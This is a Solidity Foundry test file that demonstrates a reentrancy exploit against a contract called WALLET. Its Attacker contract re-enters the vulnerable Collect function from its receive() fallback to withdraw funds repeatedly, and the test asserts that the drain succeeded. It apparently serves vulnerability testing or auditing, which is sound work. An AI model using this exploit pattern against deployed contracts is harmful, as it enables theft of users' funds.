
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {WALLET, Log} from "../src/WALLET.sol";

contract TestReentrancyWALLET is Test {
    WALLET public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new WALLET(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal >= 1 ether && attackVal < type(uint128).max);

        // --- 2. State Configuration (Pre-Condition) ---
        // The contract requires unlockTime to have passed

        // --- 3. Funding ---
        // Fund the Victim contract with enough ETH to be drained
        vm.deal(address(_contractUnderTest), attackVal * 3);
        
        // Fund the Attacker
        vm.deal(address(_attacker), attackVal * 2);

        // Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        
        // Warp time to pass the unlock time
        vm.warp(block.timestamp + 1);
        
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    WALLET public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = WALLET(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        
        // Deposit funds into the WALLET contract using Put function
        // Set unlockTime to 0 so it will be set to block.timestamp
        _victim.Put{value: val}(0);
    }

    function attack(uint256 val) public {
        // Capture Initial State
        initialSnapshot = address(this).balance;

        // Store the value for the re-entrant call
        storedAttackVal = val;

        // Call the vulnerable Collect function
        _victim.Collect(val);

        // Verify Success Conditions
        // If we managed to call Collect multiple times via reentrancy
        if (attackCallCount > 1 && address(this).balance > initialSnapshot) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        if (attackCallCount < 3) {
            // Re-enter the Collect function before state is updated
            _victim.Collect(storedAttackVal);
        }
    }
}
